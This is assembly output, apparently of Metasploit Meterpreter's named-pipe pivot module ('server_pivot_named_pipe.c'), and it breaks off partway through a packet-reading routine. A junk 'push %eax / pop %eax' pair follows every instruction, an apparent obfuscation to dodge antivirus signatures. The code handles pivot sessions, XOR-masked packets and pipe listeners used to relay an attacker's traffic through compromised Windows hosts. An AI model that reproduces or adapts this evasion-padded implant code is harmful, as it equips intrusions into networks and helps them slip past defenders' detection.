	.file	"server_pivot_named_pipe.c"
	.text
	.section .rdata,"dr"
LC0:
	.ascii "[%04x] \0"
LC1:
	.ascii "\15\12\0"
	.text
	.def	_real_dprintf;	.scl	3;	.type	32;	.endef
_real_dprintf:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%esi
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$1072, %esp
push %eax
pop %eax
	movl	__imp__GetCurrentThreadId@0, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	movl	%eax, 16(%esp)
push %eax
pop %eax
	movl	$LC0, 12(%esp)
push %eax
pop %eax
	movl	$1023, 8(%esp)
push %eax
pop %eax
	movl	$1024, 4(%esp)
push %eax
pop %eax
	leal	-1040(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp___snprintf_s, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	leal	-1040(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_strlen
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	leal	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -16(%ebp)
push %eax
pop %eax
	movl	-16(%ebp), %ecx
push %eax
pop %eax
	movl	$1021, %eax
push %eax
pop %eax
	subl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	$1024, %eax
push %eax
pop %eax
	subl	-12(%ebp), %eax
push %eax
pop %eax
	leal	-1040(%ebp), %esi
push %eax
pop %eax
	movl	-12(%ebp), %ebx
push %eax
pop %eax
	addl	%esi, %ebx
push %eax
pop %eax
	movl	%ecx, 16(%esp)
push %eax
pop %eax
	movl	8(%ebp), %ecx
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	%ebx, (%esp)
push %eax
pop %eax
	call	_vsnprintf_s
push %eax
pop %eax
	movl	$LC1, 8(%esp)
push %eax
pop %eax
	movl	$1024, 4(%esp)
push %eax
pop %eax
	leal	-1040(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__strcat_s, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	leal	-1040(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__OutputDebugStringA@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	nop
push %eax
pop %eax
	leal	-8(%ebp), %esp
push %eax
pop %eax
	popl	%ebx
push %eax
pop %eax
	popl	%esi
push %eax
pop %eax
	popl	%ebp
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
LC2:
	.ascii "advapi32.dll\0"
LC3:
	.ascii "AddMandatoryAce\0"
	.align 4
LC4:
	.ascii "[NP-SERVER] AddMandatoryAce: %p\0"
	.text
	.def	_AddMandatoryAce@20;	.scl	3;	.type	32;	.endef
_AddMandatoryAce@20:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$56, %esp
push %eax
pop %eax
	movl	_attempted.83832, %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L3
push %eax
pop %eax
	movl	$1, _attempted.83832
push %eax
pop %eax
	movl	$LC2, (%esp)
push %eax
pop %eax
	movl	__imp__LoadLibraryA@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	je	L3
push %eax
pop %eax
	movl	$LC3, 4(%esp)
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__GetProcAddress@8, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$8, %esp
push %eax
pop %eax
	movl	%eax, _pAddMandatoryAce.83833
push %eax
pop %eax
	movl	_pAddMandatoryAce.83833, %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC4, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L3:
	movl	_pAddMandatoryAce.83833, %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L4
push %eax
pop %eax
	movl	_pAddMandatoryAce.83833, %eax
push %eax
pop %eax
	movl	24(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 16(%esp)
push %eax
pop %eax
	movl	20(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 12(%esp)
push %eax
pop %eax
	movl	16(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	12(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$20, %esp
push %eax
pop %eax
L4:
	movl	$1, %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret	$20
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC5:
	.ascii "[PIVOT] Cleaning up the pipe pivot context\0"
	.align 4
LC6:
	.ascii "[PIVOT] Cleaned up the pipe pivot context\0"
	.text
	.def	_server_destroy;	.scl	3;	.type	32;	.endef
_server_destroy:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$40, %esp
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -12(%ebp)
push %eax
pop %eax
	cmpl	$0, -12(%ebp)
push %eax
pop %eax
	je	L7
push %eax
pop %eax
	movl	$LC5, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	364(%eax), %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_lock_acquire
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	368(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__CloseHandle@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__CloseHandle@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	36(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__CloseHandle@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	65932(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L8
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	65932(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	$0, 65932(%eax)
push %eax
pop %eax
L8:
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	65940(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_lock_destroy
push %eax
pop %eax
	movl	-12(%ebp), %eax
push %eax
pop %eax
	movl	364(%eax), %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_lock_release
push %eax
pop %eax
	movl	$LC6, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L7:
	movl	$0, %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.def	_terminate_pipe;	.scl	3;	.type	32;	.endef
_terminate_pipe:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	cmpl	$0, 8(%ebp)
push %eax
pop %eax
	je	L12
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	16(%eax), %eax
push %eax
pop %eax
	movl	$3, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_scheduler_signal_waitable
push %eax
pop %eax
L12:
	nop
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC7:
	.ascii "[PIVOT] removing named pipe listener\0"
	.text
	.def	_remove_listener;	.scl	3;	.type	32;	.endef
_remove_listener:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	subl	$24, %esp
push %eax
pop %eax
	movl	$LC7, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_terminate_pipe
push %eax
pop %eax
	movl	$0, %eax
push %eax
pop %eax
	leave
push %eax
pop %eax
	ret
push %eax
pop %eax
	.section .rdata,"dr"
	.align 4
LC8:
	.ascii "[PIVOT] Allocating space: %u bytes\0"
	.align 4
LC9:
	.ascii "[PIVOT] Size not yet calculated\0"
	.align 4
LC10:
	.ascii "[PIVOT] header bytes received, calculating buffer offset\0"
	.align 4
LC11:
	.ascii "[PIVOT] Packet header before XOR: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]\0"
	.align 4
LC12:
	.ascii "[PIVOT] Packet header after XOR: [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X] [0x%02X 0x%02X 0x%02X 0x%02X]\0"
	.align 4
LC13:
	.ascii "[PIVOT] Required size is %u bytes\0"
	.align 4
LC14:
	.ascii "[PIPE] Session not yet established, checking for response packet\0"
	.align 4
LC15:
	.ascii "[PIPE] Incoming packet is not encrypted!\0"
	.align 4
LC16:
	.ascii "[PIPE] Request ID found and matches expected value\0"
	.align 4
LC17:
	.ascii "[PIPE] Returned session guid: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X\0"
	.align 4
LC18:
	.ascii "[PIPE]    Pivot session guid: %02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X%02X\0"
	.align 4
LC19:
	.ascii "[PIPE] Session pivot session guid size: %u\0"
	.align 4
LC20:
	.ascii "[PIPE] Session guid returned, looks like the session is a reconnect\0"
	.align 4
LC21:
	.ascii "[PIPE] We seem to have acquired a new instance of a pivot we didnt know was dead. Killing!\0"
	.align 4
LC22:
	.ascii "[PIPE] Session guid not found, looks like the session is new\0"
	.align 4
LC23:
	.ascii "[PIVOTTREE] Pivot sessions (after new one added)\0"
	.align 4
LC24:
	.ascii "[PIPE] Informing MSF of the new named pipe pivot\0"
	.align 4
LC25:
	.ascii "[PIVOT] Entire packet is ready, size is %u, offset is %u\0"
	.align 4
LC26:
	.ascii "[PIVOT] Extra %u bytes found, shuffling data\0"
LC27:
	.ascii "[PIVOT] Packet buffer reset\0"
	.text
	.def	_read_pipe_to_packet;	.scl	3;	.type	32;	.endef
_read_pipe_to_packet:
	pushl	%ebp
push %eax
pop %eax
	movl	%esp, %ebp
push %eax
pop %eax
	pushl	%edi
push %eax
pop %eax
	pushl	%esi
push %eax
pop %eax
	pushl	%ebx
push %eax
pop %eax
	subl	$332, %esp
push %eax
pop %eax
	movl	$1, -28(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65920(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65924(%eax), %ecx
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	addl	%ecx, %eax
push %eax
pop %eax
	cmpl	%eax, %edx
push %eax
pop %eax
	jnb	L16
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65924(%eax), %edx
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	addl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 65920(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65920(%eax), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC8, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65920(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65916(%eax), %eax
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_realloc
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 65916(%edx)
push %eax
pop %eax
L16:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65916(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65924(%eax), %eax
push %eax
pop %eax
	addl	%eax, %edx
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	12(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	_memcpy
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65924(%eax), %edx
push %eax
pop %eax
	movl	16(%ebp), %eax
push %eax
pop %eax
	addl	%eax, %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 65924(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65928(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L17
push %eax
pop %eax
	movl	$LC9, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65924(%eax), %eax
push %eax
pop %eax
	cmpl	$31, %eax
push %eax
pop %eax
	jbe	L17
push %eax
pop %eax
	movl	$LC10, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65916(%eax), %eax
push %eax
pop %eax
	movl	%eax, -32(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65916(%eax), %eax
push %eax
pop %eax
	movl	%eax, -36(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$31, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$30, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -92(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$29, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -96(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$28, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -100(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$27, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -104(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$26, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -108(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$25, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -112(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$24, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -116(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$23, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -120(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$22, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -124(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$21, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -128(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$20, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -132(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$19, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -136(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$18, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -140(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$17, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -144(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$16, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -148(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$15, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -152(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$14, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -156(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$13, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -160(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$12, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -164(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$11, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -168(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$10, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -172(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$9, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -176(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$8, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -180(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$7, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -184(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$6, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -188(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$5, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$3, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$2, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -192(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%edx, 128(%esp)
push %eax
pop %eax
	movl	-92(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 124(%esp)
push %eax
pop %eax
	movl	-96(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 120(%esp)
push %eax
pop %eax
	movl	-100(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 116(%esp)
push %eax
pop %eax
	movl	-104(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 112(%esp)
push %eax
pop %eax
	movl	-108(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 108(%esp)
push %eax
pop %eax
	movl	-112(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 104(%esp)
push %eax
pop %eax
	movl	-116(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 100(%esp)
push %eax
pop %eax
	movl	-120(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 96(%esp)
push %eax
pop %eax
	movl	-124(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 92(%esp)
push %eax
pop %eax
	movl	-128(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 88(%esp)
push %eax
pop %eax
	movl	-132(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 84(%esp)
push %eax
pop %eax
	movl	-136(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 80(%esp)
push %eax
pop %eax
	movl	-140(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 76(%esp)
push %eax
pop %eax
	movl	-144(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 72(%esp)
push %eax
pop %eax
	movl	-148(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 68(%esp)
push %eax
pop %eax
	movl	-152(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 64(%esp)
push %eax
pop %eax
	movl	-156(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 60(%esp)
push %eax
pop %eax
	movl	-160(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 56(%esp)
push %eax
pop %eax
	movl	-164(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 52(%esp)
push %eax
pop %eax
	movl	-168(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 48(%esp)
push %eax
pop %eax
	movl	-172(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 44(%esp)
push %eax
pop %eax
	movl	-176(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 40(%esp)
push %eax
pop %eax
	movl	-180(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 36(%esp)
push %eax
pop %eax
	movl	-184(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 32(%esp)
push %eax
pop %eax
	movl	-188(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 28(%esp)
push %eax
pop %eax
	movl	%edi, 24(%esp)
push %eax
pop %eax
	movl	%esi, 20(%esp)
push %eax
pop %eax
	movl	%ebx, 16(%esp)
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	-192(%ebp), %esi
push %eax
pop %eax
	movl	%esi, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC11, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	leal	24(%eax), %edx
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	$4, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_xor_bytes
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65916(%eax), %eax
push %eax
pop %eax
	movl	%eax, -36(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$31, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$30, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -92(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$29, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -96(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$28, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -100(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$27, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -104(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$26, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -108(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$25, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -112(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$24, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -116(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$23, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -120(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$22, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
